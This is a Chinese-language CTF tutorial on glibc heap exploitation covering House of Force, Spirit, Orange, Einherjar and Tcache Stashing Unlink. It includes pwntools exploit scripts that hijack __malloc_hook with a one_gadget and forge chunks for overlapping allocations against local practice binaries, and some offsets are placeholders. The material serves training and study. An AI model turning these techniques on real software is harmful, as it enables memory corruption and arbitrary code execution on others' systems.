# 堆利用进阶：House系列技术详解

## 1. 概述

"House of XXX" 是堆利用领域的经典技术命名传统，源自 Phrack 系列文章。每种House技术针对特定的glibc版本和堆管理特性，在CTF断网离线环境下，熟练掌握这些技术能应对大多数中等偏难的堆题。

本文重点覆盖 CTF 中最常见的五种House技术及其现代变体。

## 2. 核心原理

### 2.1 House of Force

**利用条件**：可以修改top_chunk的size字段
**原理**：将top_chunk的size改为极大值(如-1)，然后计算精确的分配大小使top_chunk迁移到任意地址，再次分配即可获得该地址的chunk

```
正常流程：
top_chunk = old_top + request_size
House of Force:
top_chunk = old_top + evil_request_size  # 使新的top_chunk == target
下一次malloc即可返回target地址的chunk
```

**关键公式**：
```python
evil_size = (target_addr - 2*SIZE_SZ) - (old_top_chunk_addr + 2*SIZE_SZ)
# 或简化: evil_size = target_addr - top_chunk_addr - 0x10 (64位)
```

### 2.2 House of Spirit

**利用条件**：可以伪造一个chunk并使伪造地址被free()接受
**原理**：在可控内存（栈、bss）上构造假chunk，free后该地址进入bin，再次malloc即可获得对该内存的读写权

```python
# 构造假chunk要求（64位）：
# 1. prev_size: 随意
# 2. size: 必须匹配fastbin大小(0x20-0x80)，或构造next_chunk满足检查
# 3. next_chunk的size需要满足PREV_INUSE检查（free时检查）
fake_chunk = p64(0) + p64(0x51)  # 最简形式：prev_size=0, size=0x51
# free(&fake_chunk + 0x10)  # 从user data部分开始free
```

### 2.3 House of Orange

**利用条件**：无free函数，但可以触发brk()扩展堆或mmap
**原理**：通过堆溢出修改top_chunk size，使malloc请求大于当前top时触发sysmalloc（brk扩展），旧的top_chunk被free进入unsorted_bin，获取libc泄露。同时利用_IO_list_all进行FSOP。

```c
// 经典House of Orange流程:
// 1. 通过溢出修改top_chunk size（使其小于某个页对齐阈值）
// 2. malloc(大于新top_size的size) -> 触发sysmalloc -> 旧top进入unsorted_bin
// 3. 从unsorted_bin泄露libc
// 4. 利用_IO_file链进行FSOP
```

### 2.4 House of Einherjar

**利用条件**：off-by-one null byte + 堆布局控制
**原理**：通过null byte off-by-one清除下一chunk的PREV_INUSE位，并构造prev_size字段，触发unlink时合并出虚假的大chunk

```
利用步骤：
1. 分配 A, B, C (B的size末尾为0x00，如0x100)
2. 在A内部伪造一个chunk F
3. 利用off-by-one清除B的PREV_INUSE位
4. 设置B的prev_size = &B - &F（指向伪造chunk）
5. free(B) -> 向前合并 -> F成为新的空闲chunk（与C重叠）
6. malloc返回F，覆盖C的内容
```

### 2.5 Tcache Stashing Unlink Attack (glibc 2.29+)

**利用条件**：smallbin中有chunk，可以修改bk指针
**原理**：当tcache未满时，从smallbin取chunk会顺带把同大小的其他smallbin chunk转移到tcache中（stashing），通过对bk指针的伪造可以写入一个libc地址到任意位置。

```python
# 利用效果：向任意地址写入一个main_arena附近的libc地址
# 要求：smallbin中有2个以上chunk，tcache未满
# 伪造第二个chunk的bk = target_addr - 0x10
# stash过程会把target_addr处的fd写为main_arena地址
```

## 3. 关键技巧/检测方法

### 3.1 堆题分析流程

```
1. 确定glibc版本 -> 决定可用技术
2. 分析数据结构体和操作函数
3. 找漏洞：溢出/UAF/double free/off-by-one
4. 规划堆布局（画出期望的堆状态图）
5. 泄露heap和libc地址
6. 劫持控制流（hook/IO/FSOP）
```

### 3.2 glibc版本检测

```python
# pwntools
elf = ELF('./binary')
libc = ELF('./libc.so.6')

# 运行时检测libc版本
# 方法1：泄露地址后匹配libc database
# 方法2：通过__libc_start_main的偏移
# 离线环境：使用已知的libc版本列表
# 或通过pwntools的libcdb功能（需提前缓存到本地）
```

### 3.3 Hook劫持（各版本方案）

```
glibc 2.23-2.33:
  __malloc_hook -> one_gadget
  __free_hook -> system (free("/bin/sh") == system("/bin/sh"))
  __realloc_hook -> 配合realloc调整栈

glibc 2.34+（hook被移除）:
  _IO_list_all -> FSOP
  _IO_file_jumps -> 虚表劫持
  exit() -> rtld_lock_default_lock_recursive (link_map劫持)
  House of Apple 1/2/3
```

## 4. 常见误区与注意事项

1. **House of Force在2.29+被修复**：top chunk size被检查是否超限
2. **House of Orange依赖FSOP**：2.28+ ptmalloc的_IO_list_all检查更严
3. **tcache fd指针加密**：glibc 2.32+使用safe-linking，fd = (addr >> 12) ^ original_fd
4. **堆风水需要耐心**：每种技术对堆布局有严格要求，一步错全盘输
5. **堆地址随机化**：ASLR下必须泄露heap地址才能进行精确计算

## 5. 实战示例

### 5.1 House of Force 完整利用

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
House of Force 完整利用 (glibc 2.23)
目标：分配chunk到__malloc_hook，写入one_gadget
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./house_of_force')
elf = ELF('./house_of_force')

def add(size, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'data:', data)

def show():
    p.sendlineafter(b'>', b'2')

# ---- Step 1: 泄露heap地址 ----
add(0x18, b'A' * 0x18)  # 溢出修改top_chunk size
show()
p.recvuntil(b'A' * 0x18)
heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
# 解析top_chunk地址（heap_base + 0x20 + 头）
top_chunk_addr = heap_leak + 0x20 + 0x10  # user_data + size_of_first_chunk
log.info(f'Top chunk addr: {hex(top_chunk_addr)}')

# ---- Step 2: 溢出修改top_chunk size为最大值 ----
add(0x18, b'A' * 0x18 + p64(0xFFFFFFFFFFFFFFFF))  # 改写top_chunk->size = -1

# ---- Step 3: 计算偏移分配 ----
# 目标：让下一次分配返回__malloc_hook地址
# __malloc_hook = libc_base + __malloc_hook_offset
# 需要先泄露libc（略，此处假设已知）
malloc_hook = 0x7ffff7dcbc30  # 需替换为实际值

# 计算evil_size
# evil_size = target - top_chunk_addr - 0x10
evil_size = malloc_hook - top_chunk_addr - 0x10
# 更精确：evil_size = target - (old_top + 2*SIZE_SZ)
#            = malloc_hook - top_chunk_addr - 0x10
# 因为malloc返回user_data，需要target是返回地址
# 实际计算：malloc返回 user_data = old_top+0x10, 要返回 malloc_hook-0x??
target_user_data = malloc_hook - 0x20  # 调整偏移

evil_size = target_user_data - (top_chunk_addr + 0x10) - 0x10
log.info(f'Evil size: {hex(evil_size)}')

# 确保evil_size合法（对齐且足够大）
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'size:', str(evil_size).encode())

# ---- Step 4: 下一次malloc返回__malloc_hook附近 ----
# 写入one_gadget到__malloc_hook
one_gadget = 0x4526a  # one_gadget偏移
add(0x20, b'A' * 0x10 + p64(one_gadget))

# 触发malloc
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'size:', b'10')
p.interactive()
```

### 5.2 House of Spirit 完整利用

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
House of Spirit: 在栈上伪造chunk并free，实现栈内存分配
典型场景：程序变量在栈上，可向栈写数据，无free但有可控free目标
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./house_of_spirit')

# ---- 假设场景：存在栈缓冲区，可控制其内容 ----
# 需要向栈上写入伪造的chunk结构

# 1. 获取栈地址（通过泄露）
p.recvuntil(b'Stack addr: ')
stack_addr = int(p.recvline().strip(), 16)
log.info(f'Stack addr: {hex(stack_addr)}')

# 2. 在栈上构造假chunk (64位)
# 假设栈地址 0x7ffffffde000  
# 我们要在栈上伪造一个0x50大小的fastbin chunk
fake_chunk_addr = stack_addr + 0x20  # 用户数据的起始位置

# 假chunk的结构（从chunk头开始）：
fake_chunk = flat([
    p64(0),         # prev_size (可随意)
    p64(0x51),      # size (必须是合法的fastbin size，且IS_MMAPPED=0, NON_MAIN_ARENA=0)
    # user data 开始于 fake_chunk_addr + 0x10
    p64(0),         # fd (会被fastbin修改)
    p64(0),         # bk
    p64(0) * 6,     # 填充
    # 下一个假chunk的头（用于free时的检查）
    p64(0x50),      # prev_size
    p64(0x21),      # next_chunk的size（PREV_INUSE需设置）
])

# 写入栈
p.sendafter(b'Data:', fake_chunk)

# 3. 调用free(fake_chunk_addr + 0x10)（即user data指针）
# 在程序中可能通过篡改free参数实现
# 或者存在一个指向栈的指针被free

# 4. malloc获取栈内存
# new_chunk = malloc(0x48)  # 返回 fake_chunk_addr + 0x10
# 此时可以向栈上关键区域写入ROP链

log.success('House of Spirit setup complete!')
p.interactive()
```

### 5.3 House of Einherjar (off-by-one null)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
House of Einherjar: off-by-one null byte 利用
清除下一chunk的PREV_INUSE并控制prev_size实现overlap
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./einherjar')

def add(idx, size, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data:
        p.sendafter(b'data:', data)

def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

# ---- 堆布局 ----
add(0, 0x28, b'A' * 0x28)  # chunk A (0x30实际)
add(1, 0xf0, b'B' * 0xf0)  # chunk B (0x100实际, size末字节0x01含PREV_INUSE)
add(2, 0x100, b'C' * 0x100) # 屏障chunk

# ---- 在A内部伪造一个chunk ----
# 在A内偏移0x10处伪造chunk，size设为 A末尾到B开头
fake_size = 0x20 + 0x100  # A剩余 + 整个B
# 伪造chunk头
# A在0x10偏移处伪造: prev_size=0, size=0x120 (需配合prev_size)
# 这里简化，假设A足够大

delete(0)  # 先释放A

# ---- off-by-one 清除B的PREV_INUSE ----
# B的size从0x101改为0x100 (清除PREV_INUSE)
# 同时设置B的prev_size指向伪造chunk
add(3, 0x28, b'X' * 0x20 + p64(fake_size) + b'\x00')  # off-by-one写\x00到B->size

# ---- free(B)触发后向合并 ----
delete(1)  # B的prev_size指向A内伪造chunk, PREV_INUSE=0, 触发合并
# 现在一个大的overlapped chunk包含了chunk C的区域

# ---- 分配overlapped chunk，控制C ----
add(4, 0x1F0, b'OVERLAP' + p64(0) * 10)  # 获取overlap chunk
# 通过4可以读写C的内容 -> UAF/C功能

p.interactive()
```
